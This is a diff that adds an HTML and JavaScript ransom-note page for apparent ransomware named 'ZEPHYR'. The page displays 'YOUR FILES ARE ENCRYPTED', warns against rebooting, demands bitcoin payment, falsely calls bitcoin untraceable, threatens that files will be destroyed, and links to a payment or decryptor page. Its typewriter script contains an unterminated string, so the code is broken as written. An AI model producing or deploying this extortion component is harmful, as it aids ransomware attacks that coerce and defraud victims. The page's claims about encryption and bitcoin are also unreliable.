@@ -1,0 +1,56 @@
+
+
+<!-- This link will add ?run=true to your URL, myfilename.php?run=true -->
+<style>
+body {
+font-family:monospace;
+background-image:url("skull.jpg");
+background-size:cover;
+color:red;
+}
+a {
+font-family:monospace;
+color:white;
+}
+</style>
+<script>
+var i = 0;
+var txt = '\n\r YOUR FILES ARE ENCRYPTED WITH ZEPHYR. ALL FILES ARE LOCKED AND INACCESSIBLE.\n\r;
+var speed = 50;
+
+function typeWriter() {
+var a = document.getElementById("test").innerHTML;
+document.getElementById("test").innerHTML = "bats";
+  if (i < txt.length) {
+    document.getElementById("demo").innerHTML += txt.charAt(i);
+    i++;
+    setTimeout(typeWriter, speed);
+  }
+document.getElementById("test").innerHTML = a;
+}
+</script>
+
+<div style="font-size:100px"> ZEPHYR </div>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+<body onload="typeWriter()">
+<p id="demo"></p>
+<br>
+
+<div id="test">
+<b>DO NOT REBOOT!</b> Data will be irretrievable. <br>
+What is encryption? <br>
+Encryption is a process which encodes your files, rendering them unusable until they are unlocked with a special key. We currently have the key, and until you pay us, you  will be unable to access your files. <br>
+What is bitcoin?  <br>
+Bitcoin is an untraceable digital currency. It is entirely anonymous and any transactions will be unlocatable. To get bitcoins, go to blockchain.info or similar site.  <br>
+What if I dont pay?  <br>
+If you dont pay, it means your files will not be decrypted. You lose and we lose, so you should just pay us.  <br>
+Can I decrypt my files any other way?  <br>
+No, this will not work and your files will be destroyed.  <br>
+<b>HOW TO GET DECRYPTED</b>
+The link below is a link to the decryption software. Download and place into home folder, then type the link localhost:1337/decrypt.php <br>
+<a href="http://satoshibox.com/tv2agurzf36mvks6za4rwh86">DECRYPTOR LINK</a>
+<br>
+Good Luck.
+
+</body>
